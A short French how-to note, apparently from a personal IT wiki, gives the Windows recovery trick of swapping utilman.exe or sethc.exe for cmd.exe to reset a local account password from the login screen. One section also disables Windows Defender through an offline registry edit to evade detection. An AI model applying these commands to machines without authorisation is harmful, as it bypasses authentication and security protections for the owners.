

# Prérequis

Disque d'install ou clé USB avec ISO
Si problèmes avec les volumes voir [[DISKPART]]

# UTILMAN

1. Lancer la machine en mode réparation
2. Cliquer sur Dépannage
3. Command Prompt
4. Taper les commandes 

```cmd
rename c:\windows\system32\utilman.exe c:\windows\system32\utilman.old
```

```cmd
copy c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe
```

6. Taper All si besoin d'Overwrite
7. Exit
8. Enter
9. Cliquer sur les options d'ergonomie
10. Taper la commande

```cmd
net user <username> <new_password>
```

12. Exit le cmd
13. Login avec le nouveau password.

# SETHC

1. Lancer la machine en mode réparation
2. Cliquer sur Dépannage
3. Command Prompt
4. Taper les commandes 

```cmd
copy c:\windows\system32\sethc.exe c:\
```

```cmd
copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
```

5. Désactiver Defender qui connait l'astuce
```cmd
reg load HKLM\temp-hive c:\windows\system32\config\SOFTWARE
```

```cmd
reg add "HKLM\temp-hive\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

```cmd
reg unload HKLM\temp-hive
```

6. Taper All si besoin d'Overwrite
7. Exit
8. Enter
9. Presser Shift 5 fois
10. Taper la commande

```cmd
net user <username> <new_password>
```

12. Exit le cmd
13. Login avec le nouveau password.

